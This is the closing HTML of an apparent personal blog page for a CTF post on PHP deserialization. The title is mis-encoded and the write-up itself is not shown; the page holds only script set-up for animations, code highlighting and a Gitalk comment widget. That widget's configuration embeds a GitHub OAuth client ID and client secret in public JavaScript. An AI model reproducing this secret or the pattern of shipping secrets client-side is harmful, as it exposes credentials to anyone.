                  <h3 class="post-title">
                    [ctfshow]PHPååºåˆ—åŒ–
                  </h3>
                </a>
              </div>
            

            
              
                <div id="gitalk-container" data-aos="fade-in"></div>
              

              
            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>




  
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>

      var gitalk = new Gitalk({
        clientID: '1b08861b8ad19018640e',
        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
        repo: 'fallingskies22.github.io',
        owner: 'fallingskies22',
        admin: ['fallingskies22'],
        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
      })

      gitalk.render('gitalk-container')

    </script>
  

  




  </body>
</html>
